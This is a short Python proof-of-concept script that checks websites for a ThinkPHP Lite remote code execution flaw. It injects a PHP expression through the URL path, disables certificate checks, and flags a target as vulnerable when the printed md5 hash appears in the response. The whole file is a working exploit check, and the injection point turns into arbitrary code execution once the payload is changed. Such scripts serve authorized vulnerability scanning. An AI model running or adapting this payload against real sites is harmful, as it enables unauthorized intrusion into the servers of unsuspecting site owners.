#!/usr/bin/env python
# coding=utf-8
import urllib
import requests
import urllib3
urllib3.disable_warnings()

def thinkphp_lite_code_exec_verify(url):
    pocdict = {
        "vulnname":"thinkphp_lite_code_exec",
        "isvul": False,
        "vulnurl":"",
        "payload":"",
        "proof":"",
        "response":"",
        "exception":"",
    }
    headers = {
        "User-Agent" : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0)',
    }
    try:
        payload = 'index.php/module/action/param1/$%7B@print%28md5%282333%29%29%7D'
        vurl = urllib.parse.urljoin(url, payload)
        req = requests.get(vurl, headers=headers, timeout=15, verify=False)
        if r"56540676a129760a3" in req.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = vurl
            pocdict['proof'] = '56540676a129760a3'
            pocdict['response'] = req.text
            print(pocdict)

    except:
        pass
